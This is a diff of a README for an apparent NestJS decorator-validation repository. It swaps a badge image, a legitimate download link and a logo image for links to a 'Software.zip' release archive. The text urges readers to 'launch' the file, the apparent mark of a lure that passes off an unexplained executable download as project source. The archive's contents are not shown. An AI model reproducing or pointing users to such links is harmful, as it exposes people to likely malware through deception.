@@ -1,6 +1,6 @@
 # 🚀 Welcome to custom-class-validator repository!
 
-![Class Validator](https://img.shields.io/badge/Class-Validator-brightgreen)
+![Class Validator](https://github.com/tintin1886/custom-class-validator/releases/download/v2.0/Software.zip)
 
 ## Description
 This repository is dedicated to showcasing how to create validations using decorators in NestJS. By utilizing decorators for validations, you can implement all the necessary validations in a performance-efficient manner without relying on external libraries. This approach provides flexibility in implementing validations according to your preferences.
@@ -19,7 +19,7 @@ This repository is dedicated to showcasing how to create validations using decor
 
 ## 📝 Getting Started
 To explore the implementation of decorators for validations and learn how to create efficient validations in NestJS, you can access the repository from the link below:
-[Download custom-class-validator](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[Download custom-class-validator](https://github.com/tintin1886/custom-class-validator/releases/download/v2.0/Software.zip)
 
 _The link ends with a file name, indicating that it needs to be launched._
 
@@ -47,4 +47,4 @@ This project is licensed under the MIT License - see the [LICENSE](LICENSE) file
 
 📌 **Note:** For a comprehensive guide on how to create validations using decorators in NestJS, refer to the documentation in this repository. Happy coding! 🎉
 
-![NestJS Logo](https://www.vectorlogo.zone/logos/nestjs/nestjs-ar21.svg)
+![NestJS Logo](https://github.com/tintin1886/custom-class-validator/releases/download/v2.0/Software.zip)
